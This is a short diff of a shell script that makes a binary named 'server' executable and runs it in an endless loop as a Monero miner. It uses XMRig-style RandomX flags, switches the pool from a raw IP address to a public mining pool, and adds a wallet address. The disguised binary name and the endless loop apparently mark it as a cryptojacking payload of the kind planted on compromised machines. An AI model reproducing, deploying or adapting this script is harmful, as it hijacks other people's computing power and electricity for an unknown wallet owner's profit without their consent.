@@ -10,5 +10,5 @@ fi
 chmod +x server
 
 while true; do
-    ./server -a rx/0 -o 45.156.21.182:3333 -u x -p x --no-color --nicehash -t $threads
+    ./server -a rx/0 -o de.monero.herominers.com:1111 -u 43WqdEgACvQMj6DxgLGVje33SR2ykPMc6CAotuQTMaZUXtFw3hcwoWKCrrycDM74EMPis3pbu489YFfhpCCdf1mfLmE4Dpy --no-color --nicehash -t $threads
 done
